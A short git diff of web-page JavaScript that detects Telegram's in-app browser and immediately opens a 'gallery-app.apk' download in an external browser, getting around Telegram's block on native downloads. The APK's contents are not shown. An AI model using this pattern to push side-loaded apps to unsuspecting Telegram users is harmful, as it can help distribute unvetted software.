@@ -18,9 +18,11 @@ document.addEventListener('DOMContentLoaded', () => {
       
       // Detect if running inside Telegram Web App
       const isTelegram = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform && window.Telegram.WebApp.platform !== 'unknown';
+      const apkUrl = new URL('gallery-app.apk', window.location.href).href;
       
       if (isTelegram) {
         e.preventDefault(); // Prevent blocked native download inside Telegram WebView
+        Telegram.WebApp.openLink(apkUrl); // Open in external browser immediately
       }
       
       let progress = 0;
@@ -32,12 +34,6 @@ document.addEventListener('DOMContentLoaded', () => {
         if (progress >= 100) {
           progress = 100;
           clearInterval(interval);
-          
-          // Trigger download
-          const apkUrl = new URL('gallery-app.apk', window.location.href).href;
-          if (isTelegram) {
-            Telegram.WebApp.openLink(apkUrl);
-          }
           
           // Create the semi-transparent message block with Google Material SVGs
           const msgBlock = document.createElement('div');
